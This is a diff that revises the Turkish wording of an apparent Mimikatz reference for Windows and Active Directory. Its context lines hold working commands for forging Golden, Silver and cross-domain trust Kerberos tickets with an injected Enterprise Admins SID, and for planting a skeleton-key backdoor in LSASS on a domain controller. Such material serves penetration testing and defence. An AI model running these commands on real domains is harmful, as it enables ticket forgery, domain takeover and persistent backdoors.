@@ -8,7 +8,7 @@
 
 Windows 8.1 ve Windows Server 2012 R2'den itibaren, kimlik bilgisi hırsızlığına karşı önemli önlemler alınmıştır:
 
-- **LM hash'leri ve düz metin şifreler** artık güvenliği artırmak için bellekte saklanmamaktadır. "clear-text" şifrelerin LSASS'te önbelleğe alınmamasını sağlamak için _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ adlı belirli bir kayıt defteri ayarının DWORD değeri `0` olarak yapılandırılması gerekmektedir.
+- **LM hash'leri ve düz metin şifreler** artık güvenliği artırmak için bellekte saklanmamaktadır. "clear-text" şifrelerin LSASS'te önbelleğe alınmadığından emin olmak için _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ adlı belirli bir kayıt defteri ayarının `0` DWORD değeri ile yapılandırılması gerekmektedir.
 
 - **LSA Koruması**, Yerel Güvenlik Otoritesi (LSA) sürecini yetkisiz bellek okuma ve kod enjeksiyonuna karşı korumak için tanıtılmıştır. Bu, LSASS'in korunan bir süreç olarak işaretlenmesiyle sağlanır. LSA Korumasının etkinleştirilmesi şunları içerir:
 1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ kayıt defterini değiştirerek `RunAsPPL` değerini `dword:00000001` olarak ayarlamak.
@@ -73,7 +73,7 @@ Silver Ticket'lar belirli hizmetlere erişim sağlar. Ana komut ve parametreler:
 - Komut: Golden Ticket'a benzer ancak belirli hizmetleri hedef alır.
 - Parametreler:
 - `/service`: Hedef alınacak hizmet (örn., cifs, http).
-- Diğer parametreler Golden Ticket'a benzer. 
+- Diğer parametreler Golden Ticket ile benzerdir.
 
 Örnek:
 ```bash
@@ -81,7 +81,7 @@ mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-12345678
 ```
 ### Güven Bileti Oluşturma
 
-Güven Biletleri, güven ilişkilerini kullanarak alanlar arasında kaynaklara erişim için kullanılır. Ana komut ve parametreler:
+Güven Biletleri, güven ilişkilerini kullanarak alanlar arasında kaynaklara erişim sağlamak için kullanılır. Ana komut ve parametreler:
 
 - Komut: Golden Ticket'e benzer ancak güven ilişkileri için.
 - Parametreler:
@@ -92,7 +92,7 @@ Güven Biletleri, güven ilişkilerini kullanarak alanlar arasında kaynaklara e
 ```bash
 mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
 ```
-### Ek Kerberos Komutları
+### Ekstra Kerberos Komutları
 
 - **Biletleri Listeleme**:
 
@@ -152,7 +152,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Çeşitli
 
-- **MISC::Skeleton**: DC üzerindeki LSASS'a bir arka kapı enjekte eder.
+- **MISC::Skeleton**: Bir DC'de LSASS'a arka kapı enjekte eder.
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
 ### Yetki Yükseltme
